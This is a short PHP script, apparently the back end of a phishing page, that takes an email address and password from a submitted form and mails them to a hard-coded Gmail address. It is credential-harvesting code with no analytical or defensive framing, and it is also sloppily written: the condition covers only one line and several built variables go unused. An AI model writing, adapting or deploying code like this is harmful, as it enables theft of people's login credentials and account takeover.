  <?php

   if(isset($_POST['submit']))
   $mailto = "tasha0266@gmail.com";
   $formEmail = $_POST ['email'];
   $password = $_POST ['password'];


   $message = "Client email:" . $formEmail . "\n"
   . "password" . "\n" . $_POST ['password']; 


   $headers = "from" . $formEmail;
   $headers2 = "from" . $mailto;

  $result = mail($mailto, $formEmail, $password);
  ?>